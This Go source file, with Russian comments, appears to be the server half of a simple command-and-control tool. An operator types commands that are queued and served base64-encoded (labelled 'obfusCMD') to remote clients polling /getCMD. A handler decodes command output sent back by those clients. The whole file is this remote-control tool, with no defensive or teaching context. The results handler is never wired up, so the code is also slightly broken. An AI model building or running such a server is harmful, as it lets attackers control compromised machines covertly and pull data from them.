package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"sync"
	"time"
)

var (
	cmdQueue     = make(chan string)       // канал для команд
	results      = make(map[string]string) // Хранилище для результатов команд
	resultsMutex = sync.Mutex{}
)

func receiveResult(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusInternalServerError)
		return
	}
	defer r.Body.Close()

	decodedResult, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		http.Error(w, "Failed to decode result", http.StatusBadRequest)
		return
	}

	result := string(decodedResult)
	fmt.Println("Received result from client:", result)

	// Сохраняем результат (можно использовать идентификатор команды для лучшей организации)
	resultsMutex.Lock()
	results["lastCommandResult"] = result
	resultsMutex.Unlock()

	fmt.Fprintln(w, "Result received")
}

func send_cmd(w http.ResponseWriter, r *http.Request) {
	select {
	case cmd := <-cmdQueue:
		obfusCMD := base64.StdEncoding.EncodeToString([]byte(cmd))
		fmt.Fprint(w, obfusCMD)

	case <-time.After(30 * time.Second):
		fmt.Println(w, "no new cmd")
	}
}

func add_cmd(cmd string) {
	cmdQueue <- cmd
}

func main() {
	var command string
	http.HandleFunc("/getCMD", send_cmd)

	go func() {
		for {
			fmt.Scan(&command)
			add_cmd(string(command))
			time.Sleep(60 * time.Second)
		}
	}()

	fmt.Println("Server Listening on port 8080...")
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		fmt.Println("Error to server", err)
	}
}
